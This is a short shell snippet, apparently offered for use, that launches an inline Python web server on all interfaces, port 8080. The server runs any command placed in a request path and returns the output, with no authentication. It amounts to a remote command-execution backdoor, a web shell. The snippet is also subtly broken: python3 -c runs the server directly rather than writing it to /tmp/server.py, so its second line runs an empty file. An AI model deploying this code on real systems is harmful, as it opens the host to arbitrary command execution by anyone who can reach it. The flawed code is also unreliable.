python3 -c "
import http.server, subprocess, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        cmd = urllib.parse.unquote(self.path[1:])
        if cmd:
            out = subprocess.getoutput(cmd)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(out.encode())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b\"online\")
server = http.server.HTTPServer((\"0.0.0.0\", 8080), H)
server.serve_forever()
" > /tmp/server.py
python3 /tmp/server.py &
